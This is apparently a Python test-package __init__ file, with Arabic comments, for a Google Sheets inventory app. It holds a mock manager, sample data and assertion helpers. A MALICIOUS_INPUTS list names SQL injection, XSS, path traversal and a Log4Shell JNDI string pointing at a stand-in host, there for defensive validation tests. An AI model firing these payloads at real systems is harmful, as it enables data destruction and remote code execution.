"""
ملف __init__.py لمجلد الاختبارات
يحتوي على الإعدادات المشتركة والأدوات المساعدة للاختبارات
"""

import sys
import os
import unittest
from unittest.mock import Mock, patch

# إضافة مسار المشروع الرئيسي
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, PROJECT_ROOT)

# إعدادات الاختبار المشتركة
TEST_CONFIG = {
    "credentials_file": "test_credentials.json",
    "spreadsheet_name": "Test Inventory",
    "worksheet_name": "Test Sheet",
    "timeout": 30,
    "max_retries": 3
}

class MockSheetsManager:
    """مدير جداول جوجل مموه للاختبارات"""
    
    def __init__(self, *args, **kwargs):
        self.connected = False
        self.data = []
        self.log_data = []
        
    def connect(self):
        """محاكاة الاتصال"""
        self.connected = True
        return True
        
    def get_all_items(self):
        """محاكاة جلب البيانات"""
        if not self.connected:
            raise Exception("غير متصل")
        return self.data.copy()
        
    def add_item(self, name, quantity):
        """محاكاة إضافة عنصر"""
        if not name or not name.strip():
            raise ValueError("اسم العنصر مطلوب")
        if not isinstance(quantity, int) or quantity < 0:
            raise ValueError("الكمية يجب أن تكون رقم موجب")
            
        item = {
            "item_name": name.strip(),
            "quantity": quantity,
            "last_updated": "2025-10-11 10:00:00"
        }
        self.data.append(item)
        return True
        
    def update_quantity(self, name, new_quantity):
        """محاكاة تحديث الكمية"""
        if not isinstance(new_quantity, int) or new_quantity < 0:
            raise ValueError("الكمية يجب أن تكون رقم موجب")
            
        for item in self.data:
            if item["item_name"] == name:
                item["quantity"] = new_quantity
                item["last_updated"] = "2025-10-11 10:00:00"
                return True
        return False
        
    def outbound_item(self, name, quantity, recipient):
        """محاكاة إخراج بضاعة"""
        if not recipient or not recipient.strip():
            raise ValueError("اسم المستلم مطلوب")
        if not isinstance(quantity, int) or quantity <= 0:
            raise ValueError("الكمية يجب أن تكون رقم موجب")
            
        for item in self.data:
            if item["item_name"] == name:
                if item["quantity"] < quantity:
                    return False  # كمية غير كافية
                item["quantity"] -= quantity
                item["last_updated"] = "2025-10-11 10:00:00"
                
                # إضافة سجل
                self.log_data.append({
                    "operation": "OUTBOUND",
                    "item_name": name,
                    "quantity": quantity,
                    "recipient": recipient,
                    "timestamp": "2025-10-11 10:00:00"
                })
                return True
        return False
        
    def remove_item(self, name):
        """محاكاة حذف عنصر"""
        for i, item in enumerate(self.data):
            if item["item_name"] == name:
                del self.data[i]
                return True
        return False

def setup_test_environment():
    """إعداد بيئة الاختبار"""
    # تنظيف متغيرات البيئة
    test_env = os.environ.copy()
    test_env['TESTING'] = 'true'
    test_env['GOOGLE_APPLICATION_CREDENTIALS'] = 'test_credentials.json'
    
    return test_env

def create_test_data():
    """إنشاء بيانات تجريبية للاختبارات"""
    return [
        {
            "item_name": "لابتوب ديل",
            "quantity": 15,
            "last_updated": "2025-10-11 10:00:00"
        },
        {
            "item_name": "ماوس لوجيتك",
            "quantity": 50,
            "last_updated": "2025-10-11 09:30:00"
        },
        {
            "item_name": "كيبورد ميكانيكي",
            "quantity": 25,
            "last_updated": "2025-10-11 09:00:00"
        }
    ]

def assert_valid_item(item):
    """التحقق من صحة عنصر المخزون"""
    assert isinstance(item, dict), "العنصر يجب أن يكون قاموس"
    assert "item_name" in item, "العنصر يجب أن يحتوي على اسم"
    assert "quantity" in item, "العنصر يجب أن يحتوي على كمية"
    assert "last_updated" in item, "العنصر يجب أن يحتوي على تاريخ التحديث"
    
    assert isinstance(item["item_name"], str), "اسم العنصر يجب أن يكون نص"
    assert len(item["item_name"].strip()) > 0, "اسم العنصر لا يمكن أن يكون فارغ"
    assert isinstance(item["quantity"], (int, float)), "الكمية يجب أن تكون رقم"
    assert item["quantity"] >= 0, "الكمية لا يمكن أن تكون سالبة"

class BaseTestCase(unittest.TestCase):
    """فئة الاختبار الأساسية مع الأدوات المشتركة"""
    
    def setUp(self):
        """إعداد الاختبار"""
        self.test_config = TEST_CONFIG.copy()
        self.test_data = create_test_data()
        self.mock_manager = MockSheetsManager()
        
        # إضافة البيانات التجريبية
        for item in self.test_data:
            self.mock_manager.data.append(item.copy())
            
    def tearDown(self):
        """تنظيف بعد الاختبار"""
        # تنظيف البيانات
        if hasattr(self, 'mock_manager'):
            self.mock_manager.data.clear()
            self.mock_manager.log_data.clear()
            
    def assertValidItem(self, item):
        """التحقق من صحة عنصر المخزون"""
        assert_valid_item(item)
        
    def assertItemInList(self, item_name, items_list):
        """التحقق من وجود عنصر في القائمة"""
        found = any(item["item_name"] == item_name for item in items_list)
        self.assertTrue(found, f"العنصر '{item_name}' غير موجود في القائمة")
        
    def assertItemNotInList(self, item_name, items_list):
        """التحقق من عدم وجود عنصر في القائمة"""
        found = any(item["item_name"] == item_name for item in items_list)
        self.assertFalse(found, f"العنصر '{item_name}' موجود في القائمة ولا يجب أن يكون")

# متغيرات مفيدة للاختبارات
INVALID_NAMES = ["", " ", None, 123, [], {}]
INVALID_QUANTITIES = [-1, -10, "abc", None, [], {}, float('inf'), float('nan')]
MALICIOUS_INPUTS = [
    "'; DROP TABLE inventory; --",
    "<script>alert('xss')</script>",
    "../../etc/passwd",
    "' OR '1'='1",
    "${jndi:ldap://malicious.com/a}"
]

# تصدير الأدوات المفيدة
__all__ = [
    'TEST_CONFIG',
    'MockSheetsManager', 
    'setup_test_environment',
    'create_test_data',
    'assert_valid_item',
    'BaseTestCase',
    'INVALID_NAMES',
    'INVALID_QUANTITIES', 
    'MALICIOUS_INPUTS'
]